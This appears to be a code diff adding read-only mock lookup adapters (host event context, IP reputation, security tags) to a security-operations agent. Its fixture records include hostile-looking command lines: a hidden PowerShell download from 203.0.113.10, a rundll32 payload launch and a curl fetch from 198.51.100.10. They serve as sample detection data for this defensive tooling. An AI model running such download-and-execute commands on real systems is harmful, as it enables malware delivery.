@@ -13,6 +13,9 @@ from soc_agent.contracts import (
     SocAgentRiskLevel,
     SocAssetLookupRecord,
     SocEndpointProcessTreeRecord,
+    SocHostEventContextRecord,
+    SocSecurityTagRecord,
+    SocThreatIntelReputationRecord,
 )
 from soc_agent.protocols import SocActionAdapter
 
@@ -203,6 +206,9 @@ class DryRunOnlySocActionAdapter:
 
 ASSET_LOOKUP_ACTION = "asset.lookup"
 ENDPOINT_PROCESS_TREE_LOOKUP_ACTION = "endpoint.process_tree.lookup"
+HOST_EVENT_CONTEXT_LOOKUP_ACTION = "host.event_context.lookup"
+THREAT_INTEL_IP_REPUTATION_LOOKUP_ACTION = "threat_intel.ip_reputation.lookup"
+SECURITY_TAG_LOOKUP_ACTION = "security_tag.lookup"
 
 
 def asset_lookup_adapter_descriptor(
@@ -419,6 +425,288 @@ class InMemoryEndpointProcessTreeLookupActionAdapter:
         )
 
 
+def host_event_context_lookup_adapter_descriptor(
+    *,
+    adapter_id: str = "host-event-context-in-memory",
+) -> SocAgentActionAdapterDescriptor:
+    """Descriptor for a read-only host event-context lookup adapter."""
+
+    return SocAgentActionAdapterDescriptor(
+        adapter_id=adapter_id,
+        route=HOST_EVENT_CONTEXT_LOOKUP_ACTION,
+        action=HOST_EVENT_CONTEXT_LOOKUP_ACTION,
+        risk_level=SocAgentRiskLevel.READ_ONLY,
+        adapter_kind="service",
+        external_side_effect="read",
+        dry_run_supported=True,
+        execute_supported=True,
+        idempotency_required=False,
+        required_payload_fields=["host_key"],
+        description="Read-only host event-context lookup adapter.",
+    )
+
+
+class InMemoryHostEventContextLookupActionAdapter:
+    """Read-only host event-context lookup backed by in-memory records."""
+
+    def __init__(
+        self,
+        records: Iterable[SocHostEventContextRecord | Mapping[str, Any]] | None = None,
+        *,
+        descriptor: SocAgentActionAdapterDescriptor | None = None,
+    ) -> None:
+        self.descriptor = descriptor or host_event_context_lookup_adapter_descriptor()
+        if self.descriptor.action != HOST_EVENT_CONTEXT_LOOKUP_ACTION or self.descriptor.route != HOST_EVENT_CONTEXT_LOOKUP_ACTION:
+            raise SocActionAdapterRegistryError("InMemoryHostEventContextLookupActionAdapter requires route/action host.event_context.lookup")
+        if self.descriptor.risk_level is not SocAgentRiskLevel.READ_ONLY:
+            raise SocActionAdapterRegistryError("InMemoryHostEventContextLookupActionAdapter must be read-only")
+        if self.descriptor.external_side_effect != "read":
+            raise SocActionAdapterRegistryError("InMemoryHostEventContextLookupActionAdapter must declare external_side_effect=read")
+        self._records = _index_host_event_context_records(records or _default_host_event_context_records())
+
+    def dry_run(
+        self,
+        command: SocAgentActionCommand,
+        *,
+        context: ServiceRequestContext,
+    ) -> SocAgentActionResult:
+        if not command.dry_run:
+            raise SocActionAdapterRegistryError("host.event_context.lookup dry-run requires command.dry_run=true")
+        _validate_command_matches_descriptor(command, self.descriptor)
+        _validate_required_fields("payload", command.payload, self.descriptor.required_payload_fields)
+        host_key = _host_key_from_payload(command.payload, action=HOST_EVENT_CONTEXT_LOOKUP_ACTION)
+        return SocAgentActionResult(
+            route=command.route,
+            action=command.action,
+            status="success",
+            message="Host event-context lookup dry-run validated; no host telemetry read executed.",
+            payload={
+                "adapter_id": self.descriptor.adapter_id,
+                "adapter_kind": self.descriptor.adapter_kind,
+                "dry_run": True,
+                "host_key": host_key,
+                "host_event_context_found": None,
+                "external_side_effect": "not_executed",
+                "read_only": True,
+                "executed_by": context.actor.model_dump(mode="json"),
+                "idempotency_key": context.idempotency_key,
+            },
+        )
+
+    def execute(
+        self,
+        command: SocAgentActionCommand,
+        *,
+        context: ServiceRequestContext,
+    ) -> SocAgentActionResult:
+        if command.dry_run:
+            raise SocActionAdapterRegistryError("host.event_context.lookup execute requires command.dry_run=false")
+        _validate_command_matches_descriptor(command, self.descriptor)
+        _validate_required_fields("payload", command.payload, self.descriptor.required_payload_fields)
+        host_key = _host_key_from_payload(command.payload, action=HOST_EVENT_CONTEXT_LOOKUP_ACTION)
+        record = self._records.get(_normalize_asset_key(host_key))
+        return SocAgentActionResult(
+            route=command.route,
+            action=command.action,
+            status="success",
+            message=(f"Host event-context lookup completed for {host_key}." if record is not None else f"Host event-context lookup completed; no host context matched {host_key}."),
+            payload=_host_event_context_lookup_payload(
+                descriptor=self.descriptor,
+                host_key=host_key,
+                record=record,
+                context=context,
+            ),
+        )
+
+
+def threat_intel_ip_reputation_lookup_adapter_descriptor(
+    *,
+    adapter_id: str = "threat-intel-ip-reputation-in-memory",
+) -> SocAgentActionAdapterDescriptor:
+    """Descriptor for a read-only IP reputation lookup adapter."""
+
+    return SocAgentActionAdapterDescriptor(
+        adapter_id=adapter_id,
+        route=THREAT_INTEL_IP_REPUTATION_LOOKUP_ACTION,
+        action=THREAT_INTEL_IP_REPUTATION_LOOKUP_ACTION,
+        risk_level=SocAgentRiskLevel.READ_ONLY,
+        adapter_kind="service",
+        external_side_effect="read",
+        dry_run_supported=True,
+        execute_supported=True,
+        idempotency_required=False,
+        required_payload_fields=["ip"],
+        description="Read-only threat intelligence IP reputation lookup adapter.",
+    )
+
+
+class InMemoryThreatIntelIpReputationLookupActionAdapter:
+    """Read-only IP reputation lookup backed by in-memory records."""
+
+    def __init__(
+        self,
+        records: Iterable[SocThreatIntelReputationRecord | Mapping[str, Any]] | None = None,
+        *,
+        descriptor: SocAgentActionAdapterDescriptor | None = None,
+    ) -> None:
+        self.descriptor = descriptor or threat_intel_ip_reputation_lookup_adapter_descriptor()
+        if self.descriptor.action != THREAT_INTEL_IP_REPUTATION_LOOKUP_ACTION or self.descriptor.route != THREAT_INTEL_IP_REPUTATION_LOOKUP_ACTION:
+            raise SocActionAdapterRegistryError("InMemoryThreatIntelIpReputationLookupActionAdapter requires route/action threat_intel.ip_reputation.lookup")
+        if self.descriptor.risk_level is not SocAgentRiskLevel.READ_ONLY:
+            raise SocActionAdapterRegistryError("InMemoryThreatIntelIpReputationLookupActionAdapter must be read-only")
+        if self.descriptor.external_side_effect != "read":
+            raise SocActionAdapterRegistryError("InMemoryThreatIntelIpReputationLookupActionAdapter must declare external_side_effect=read")
+        self._records = _index_threat_intel_records(records or _default_threat_intel_records())
+
+    def dry_run(
+        self,
+        command: SocAgentActionCommand,
+        *,
+        context: ServiceRequestContext,
+    ) -> SocAgentActionResult:
+        if not command.dry_run:
+            raise SocActionAdapterRegistryError("threat_intel.ip_reputation.lookup dry-run requires command.dry_run=true")
+        _validate_command_matches_descriptor(command, self.descriptor)
+        _validate_required_fields("payload", command.payload, self.descriptor.required_payload_fields)
+        ip = _ip_from_payload(command.payload)
+        return SocAgentActionResult(
+            route=command.route,
+            action=command.action,
+            status="success",
+            message="Threat intelligence IP reputation lookup dry-run validated; no threat-intel read executed.",
+            payload={
+                "adapter_id": self.descriptor.adapter_id,
+                "adapter_kind": self.descriptor.adapter_kind,
+                "dry_run": True,
+                "ip": ip,
+                "reputation_found": None,
+                "external_side_effect": "not_executed",
+                "read_only": True,
+                "executed_by": context.actor.model_dump(mode="json"),
+                "idempotency_key": context.idempotency_key,
+            },
+        )
+
+    def execute(
+        self,
+        command: SocAgentActionCommand,
+        *,
+        context: ServiceRequestContext,
+    ) -> SocAgentActionResult:
+        if command.dry_run:
+            raise SocActionAdapterRegistryError("threat_intel.ip_reputation.lookup execute requires command.dry_run=false")
+        _validate_command_matches_descriptor(command, self.descriptor)
+        _validate_required_fields("payload", command.payload, self.descriptor.required_payload_fields)
+        ip = _ip_from_payload(command.payload)
+        record = self._records.get(_normalize_asset_key(ip))
+        return SocAgentActionResult(
+            route=command.route,
+            action=command.action,
+            status="success",
+            message=(f"Threat intelligence IP reputation lookup completed for {ip}." if record is not None else f"Threat intelligence IP reputation lookup completed; no reputation matched {ip}."),
+            payload=_threat_intel_lookup_payload(
+                descriptor=self.descriptor,
+                ip=ip,
+                record=record,
+                context=context,
+            ),
+        )
+
+
+def security_tag_lookup_adapter_descriptor(
+    *,
+    adapter_id: str = "security-tag-in-memory",
+) -> SocAgentActionAdapterDescriptor:
+    """Descriptor for a read-only security tag lookup adapter."""
+
+    return SocAgentActionAdapterDescriptor(
+        adapter_id=adapter_id,
+        route=SECURITY_TAG_LOOKUP_ACTION,
+        action=SECURITY_TAG_LOOKUP_ACTION,
+        risk_level=SocAgentRiskLevel.READ_ONLY,
+        adapter_kind="service",
+        external_side_effect="read",
+        dry_run_supported=True,
+        execute_supported=True,
+        idempotency_required=False,
+        required_payload_fields=["entity_key"],
+        description="Read-only security tag lookup adapter.",
+    )
+
+
+class InMemorySecurityTagLookupActionAdapter:
+    """Read-only security tag lookup backed by in-memory records."""
+
+    def __init__(
+        self,
+        records: Iterable[SocSecurityTagRecord | Mapping[str, Any]] | None = None,
+        *,
+        descriptor: SocAgentActionAdapterDescriptor | None = None,
+    ) -> None:
+        self.descriptor = descriptor or security_tag_lookup_adapter_descriptor()
+        if self.descriptor.action != SECURITY_TAG_LOOKUP_ACTION or self.descriptor.route != SECURITY_TAG_LOOKUP_ACTION:
+            raise SocActionAdapterRegistryError("InMemorySecurityTagLookupActionAdapter requires route/action security_tag.lookup")
+        if self.descriptor.risk_level is not SocAgentRiskLevel.READ_ONLY:
+            raise SocActionAdapterRegistryError("InMemorySecurityTagLookupActionAdapter must be read-only")
+        if self.descriptor.external_side_effect != "read":
+            raise SocActionAdapterRegistryError("InMemorySecurityTagLookupActionAdapter must declare external_side_effect=read")
+        self._records = _index_security_tag_records(records or _default_security_tag_records())
+
+    def dry_run(
+        self,
+        command: SocAgentActionCommand,
+        *,
+        context: ServiceRequestContext,
+    ) -> SocAgentActionResult:
+        if not command.dry_run:
+            raise SocActionAdapterRegistryError("security_tag.lookup dry-run requires command.dry_run=true")
+        _validate_command_matches_descriptor(command, self.descriptor)
+        _validate_required_fields("payload", command.payload, self.descriptor.required_payload_fields)
+        entity_key = _entity_key_from_payload(command.payload)
+        return SocAgentActionResult(
+            route=command.route,
+            action=command.action,
+            status="success",
+            message="Security tag lookup dry-run validated; no tag store read executed.",
+            payload={
+                "adapter_id": self.descriptor.adapter_id,
+                "adapter_kind": self.descriptor.adapter_kind,
+                "dry_run": True,
+                "entity_key": entity_key,
+                "security_tag_found": None,
+                "external_side_effect": "not_executed",
+                "read_only": True,
+                "executed_by": context.actor.model_dump(mode="json"),
+                "idempotency_key": context.idempotency_key,
+            },
+        )
+
+    def execute(
+        self,
+        command: SocAgentActionCommand,
+        *,
+        context: ServiceRequestContext,
+    ) -> SocAgentActionResult:
+        if command.dry_run:
+            raise SocActionAdapterRegistryError("security_tag.lookup execute requires command.dry_run=false")
+        _validate_command_matches_descriptor(command, self.descriptor)
+        _validate_required_fields("payload", command.payload, self.descriptor.required_payload_fields)
+        entity_key = _entity_key_from_payload(command.payload)
+        record = self._records.get(_normalize_asset_key(entity_key))
+        return SocAgentActionResult(
+            route=command.route,
+            action=command.action,
+            status="success",
+            message=(f"Security tag lookup completed for {entity_key}." if record is not None else f"Security tag lookup completed; no security tag matched {entity_key}."),
+            payload=_security_tag_lookup_payload(
+                descriptor=self.descriptor,
+                entity_key=entity_key,
+                record=record,
+                context=context,
+            ),
+        )
+
+
 def _adapter_key(route: str, action: str) -> tuple[str, str]:
     return (route.strip(), action.strip())
 
@@ -467,6 +755,32 @@ def _index_process_tree_records(records: Iterable[SocEndpointProcessTreeRecord |
     return index
 
 
+def _index_host_event_context_records(records: Iterable[SocHostEventContextRecord | Mapping[str, Any]]) -> dict[str, SocHostEventContextRecord]:
+    index: dict[str, SocHostEventContextRecord] = {}
+    for item in records:
+        record = item if isinstance(item, SocHostEventContextRecord) else SocHostEventContextRecord.model_validate(item)
+        for key in (record.host_key, record.hostname, record.primary_ip):
+            if key:
+                index[_normalize_asset_key(key)] = record
+    return index
+
+
+def _index_threat_intel_records(records: Iterable[SocThreatIntelReputationRecord | Mapping[str, Any]]) -> dict[str, SocThreatIntelReputationRecord]:
+    index: dict[str, SocThreatIntelReputationRecord] = {}
+    for item in records:
+        record = item if isinstance(item, SocThreatIntelReputationRecord) else SocThreatIntelReputationRecord.model_validate(item)
+        index[_normalize_asset_key(record.ip)] = record
+    return index
+
+
+def _index_security_tag_records(records: Iterable[SocSecurityTagRecord | Mapping[str, Any]]) -> dict[str, SocSecurityTagRecord]:
+    index: dict[str, SocSecurityTagRecord] = {}
+    for item in records:
+        record = item if isinstance(item, SocSecurityTagRecord) else SocSecurityTagRecord.model_validate(item)
+        index[_normalize_asset_key(record.entity_key)] = record
+    return index
+
+
 def _asset_key_from_payload(payload: Mapping[str, Any]) -> str:
     value = payload.get("asset_key")
     if not isinstance(value, str) or not value.strip():
@@ -474,10 +788,24 @@ def _asset_key_from_payload(payload: Mapping[str, Any]) -> str:
     return value.strip()
 
 
-def _host_key_from_payload(payload: Mapping[str, Any]) -> str:
+def _host_key_from_payload(payload: Mapping[str, Any], *, action: str = ENDPOINT_PROCESS_TREE_LOOKUP_ACTION) -> str:
     value = payload.get("host_key")
     if not isinstance(value, str) or not value.strip():
-        raise SocActionAdapterRegistryError("endpoint.process_tree.lookup requires non-empty payload host_key")
+        raise SocActionAdapterRegistryError(f"{action} requires non-empty payload host_key")
+    return value.strip()
+
+
+def _ip_from_payload(payload: Mapping[str, Any]) -> str:
+    value = payload.get("ip")
+    if not isinstance(value, str) or not value.strip():
+        raise SocActionAdapterRegistryError("threat_intel.ip_reputation.lookup requires non-empty payload ip")
+    return value.strip()
+
+
+def _entity_key_from_payload(payload: Mapping[str, Any]) -> str:
+    value = payload.get("entity_key")
+    if not isinstance(value, str) or not value.strip():
+        raise SocActionAdapterRegistryError("security_tag.lookup requires non-empty payload entity_key")
     return value.strip()
 
 
@@ -529,6 +857,73 @@ def _process_tree_lookup_payload(
     }
 
 
+def _host_event_context_lookup_payload(
+    *,
+    descriptor: SocAgentActionAdapterDescriptor,
+    host_key: str,
+    record: SocHostEventContextRecord | None,
+    context: ServiceRequestContext,
+) -> dict[str, Any]:
+    return {
+        "adapter_id": descriptor.adapter_id,
+        "adapter_kind": descriptor.adapter_kind,
+        "dry_run": False,
+        "host_key": host_key,
+        "host_event_context_found": record is not None,
+        "host_event_context": record.model_dump(mode="json", exclude_none=True) if record is not None else None,
+        "external_side_effect": "read",
+        "read_only": True,
+        "mocked": record.mocked if record is not None else True,
+        "executed_by": context.actor.model_dump(mode="json"),
+        "idempotency_key": context.idempotency_key,
+    }
+
+
+def _threat_intel_lookup_payload(
+    *,
+    descriptor: SocAgentActionAdapterDescriptor,
+    ip: str,
+    record: SocThreatIntelReputationRecord | None,
+    context: ServiceRequestContext,
+) -> dict[str, Any]:
+    return {
+        "adapter_id": descriptor.adapter_id,
+        "adapter_kind": descriptor.adapter_kind,
+        "dry_run": False,
+        "ip": ip,
+        "reputation_found": record is not None,
+        "reputation": record.model_dump(mode="json", exclude_none=True) if record is not None else None,
+        "external_side_effect": "read",
+        "read_only": True,
+        "mocked": record.mocked if record is not None else True,
+        "executed_by": context.actor.model_dump(mode="json"),
+        "idempotency_key": context.idempotency_key,
+    }
+
+
+def _security_tag_lookup_payload(
+    *,
+    descriptor: SocAgentActionAdapterDescriptor,
+    entity_key: str,
+    record: SocSecurityTagRecord | None,
+    context: ServiceRequestContext,
+) -> dict[str, Any]:
+    return {
+        "adapter_id": descriptor.adapter_id,
+        "adapter_kind": descriptor.adapter_kind,
+        "dry_run": False,
+        "entity_key": entity_key,
+        "security_tag_found": record is not None,
+        "has_active": record.is_valid if record is not None else False,
+        "security_tag": record.model_dump(mode="json", exclude_none=True) if record is not None else None,
+        "external_side_effect": "read",
+        "read_only": True,
+        "mocked": record.mocked if record is not None else True,
+        "executed_by": context.actor.model_dump(mode="json"),
+        "idempotency_key": context.idempotency_key,
+    }
+
+
 def _default_process_tree_records() -> list[SocEndpointProcessTreeRecord]:
     return [
         SocEndpointProcessTreeRecord(
@@ -542,7 +937,7 @@ def _default_process_tree_records() -> list[SocEndpointProcessTreeRecord]:
                     "parent_pid": 700,
                     "process_name": "powershell.exe",
                     "command_line": "powershell.exe -nop -w hidden Invoke-WebRequest http://203.0.113.10/a",
-                    "user": "UM001",
+                    "user": "enterprise-user-1",
                     "risk_tags": ["suspicious_powershell", "network_download"],
                 },
                 {
@@ -550,7 +945,7 @@ def _default_process_tree_records() -> list[SocEndpointProcessTreeRecord]:
                     "parent_pid": 4200,
                     "process_name": "rundll32.exe",
                     "command_line": "rundll32.exe C:\\Users\\Public\\payload.dll,Start",
-                    "user": "UM001",
+                    "user": "enterprise-user-1",
                     "risk_tags": ["payload_execution"],
                 },
             ],
@@ -569,15 +964,89 @@ def _default_process_tree_records() -> list[SocEndpointProcessTreeRecord]:
     ]
 
 
+def _default_host_event_context_records() -> list[SocHostEventContextRecord]:
+    return [
+        SocHostEventContextRecord(
+            host_key="web-01",
+            hostname="web-01",
+            primary_ip="10.10.2.15",
+            time_window="PT30M",
+            recent_logins=[
+                {
+                    "user": "enterprise-user-1",
+                    "source_ip": "10.20.0.15",
+                    "result": "success",
+                    "method": "ssh",
+                }
+            ],
+            related_commands=[
+                {
+                    "user": "enterprise-user-1",
+                    "command": "curl http://198.51.100.10/a",
+                    "process_name": "bash",
+                }
+            ],
+            source_ips=["10.20.0.15"],
+            related_events=[
+                {
+                    "event_type": "process_execution",
+                    "summary": "Shell spawned outbound HTTP request during alert window.",
+                }
+            ],
+            host_criticality="high",
+            source="mock_host_event_context",
+            mocked=True,
+        )
+    ]
+
+
+def _default_threat_intel_records() -> list[SocThreatIntelReputationRecord]:
+    return [
+        SocThreatIntelReputationRecord(
+            ip="203.0.113.10",
+            labels=["c2_candidate", "malware_infrastructure"],
+            confidence=0.82,
+            score=82,
+            geo="ZZ",
+            source="mock_threat_intel",
+            stale=False,
+            mocked=True,
+        )
+    ]
+
+
+def _default_security_tag_records() -> list[SocSecurityTagRecord]:
+    return [
+        SocSecurityTagRecord(
+            entity_key="host:web-01",
+            entity_type="host",
+            labels=["authorized_maintenance"],
+            tag_types=["maintenance"],
+            is_valid=True,
+            source="mock_security_tag",
+            mocked=True,
+        )
+    ]
+
+
 __all__ = [
     "ASSET_LOOKUP_ACTION",
     "ENDPOINT_PROCESS_TREE_LOOKUP_ACTION",
+    "HOST_EVENT_CONTEXT_LOOKUP_ACTION",
+    "SECURITY_TAG_LOOKUP_ACTION",
+    "THREAT_INTEL_IP_REPUTATION_LOOKUP_ACTION",
     "DryRunOnlySocActionAdapter",
     "InMemoryAssetLookupActionAdapter",
     "InMemoryEndpointProcessTreeLookupActionAdapter",
+    "InMemoryHostEventContextLookupActionAdapter",
+    "InMemorySecurityTagLookupActionAdapter",
+    "InMemoryThreatIntelIpReputationLookupActionAdapter",
     "SocActionAdapterNotFoundError",
     "SocActionAdapterRegistry",
     "SocActionAdapterRegistryError",
     "asset_lookup_adapter_descriptor",
     "endpoint_process_tree_lookup_adapter_descriptor",
+    "host_event_context_lookup_adapter_descriptor",
+    "security_tag_lookup_adapter_descriptor",
+    "threat_intel_ip_reputation_lookup_adapter_descriptor",
 ]
